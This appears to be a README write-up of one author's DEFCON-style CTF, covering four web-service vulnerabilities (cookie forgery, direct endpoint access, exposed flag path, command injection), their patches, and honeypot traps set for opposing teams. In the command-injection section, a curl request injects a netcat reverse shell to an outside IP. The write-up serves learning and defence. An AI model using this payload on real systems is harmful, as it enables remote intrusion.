# Attack-Patch-Prevail-48h-Defcon-Style-CTF-Showdown

### Author

- **Panagiotis Vardalas**
### *From Pawn to Immunity*

A full-cycle exploitation and hardening of a vulnerable web service during a 48-hour DEFCON-style Capture The Flag. This repository documents the four vulnerabilities I discovered and exploited live against other teams, alongside the patches and countermeasures I deployed to transform the same service into a fortified, trap-laden stronghold.

---

## üõ†Ô∏è Overview

In a high-stakes, time-constrained CTF environment, I identified and weaponized four critical vulnerabilities in a target web service. Each exploit was then fully patched and reinforced to not only block future attacks but actively disrupt and mislead adversaries attempting to exploit the same vectors. The result: a hardened service that became more dangerous to attack than to ignore.

---

## üîç Discovered Vulnerabilities & Patch Strategies

### 1. Privilege Escalation via Cookie Forgery
- **Exploit:**  
  Manually setting a cookie with `admin=1` granted full administrative access without validation.

- **Patch:**  
  Implemented cookie signing using HMAC-based validation. Every cookie is verified server-side using a secret key to prevent tampering.

---

### 2. Restricted Action Access via Direct Endpoint Call
- **Exploit:**  
  Direct requests to `/action.php` allowed any user to add restricted items (including the flag) to their cart.

- **Patch:**  
  Enforced backend role-based access control. Admin checks were implemented at the logic level, not just in the frontend or routing layer.

---

### 3. Direct Flag Exposure via Static Path
- **Exploit:**  
  Accessing `/key` revealed the flag directly due to exposed static file routing.

- **Patch:**  
  The application was restructured around a centralized router (`index.php`) that handles all access through controlled dispatch, preventing direct file exposure.

---

### 4. Remote Code Execution via Unsafe Command Execution
- **Exploit:**  
  A function used input to build shell commands like:  
  ```bash
  curl -X POST http://$ip:8005/actions.php -d "system=nc+10.219.254.57+4444+-e+/bin/bash"
  ```
  This enabled arbitrary command execution and allowed backdoors for submitting flags even if the service appeared down.

- **Patch:**  
  Introduced a strict whitelist of allowable commands and validated inputs thoroughly. The handler was refactored to eliminate dynamic shell calls where not explicitly needed.

---

## üß† Advanced Defensive Engineering & Active Traps

Beyond patching, I actively weaponized the service to turn attack attempts into disadvantages for my opponents.

---

## üï≥Ô∏è Honeypot Traps

- **Trap 1 ‚Äì `/key`:**  
  Instead of returning a 403/404, this endpoint returned a **39KB payload** of pseudo-flag data after a **deliberate delay**, poisoning automated tools and overloading network analysis with useless but believable data.

- **Trap 2 ‚Äì Patched `/action.php`:**  
  Unauthorized calls triggered **high-latency responses** and **large data dumps** designed to resemble valid flags, stalling and confusing enemy scripts.

---

## üìâ Impact on Opponents

- Enemy **PCAP files** grew to **multiple gigabytes**, bloated with meaningless data.
- Several teams **submitted fake flags** generated by the trap payloads.
- **Automated daemons crashed** or stalled due to high latency and bandwidth/resource exhaustion.
- Attacking my service **became a liability**, shifting the risk/cost balance in my favor.

---

## ‚öîÔ∏è Conclusion

This repository showcases the offensive and defensive techniques used during a **48-hour DEFCON-style CTF** to fully compromise, secure, and militarize a web service.  
In a real-time, adversarial environment, success comes not only from breaching systems ‚Äî but from **securing and turning them into traps** that actively punish attackers.
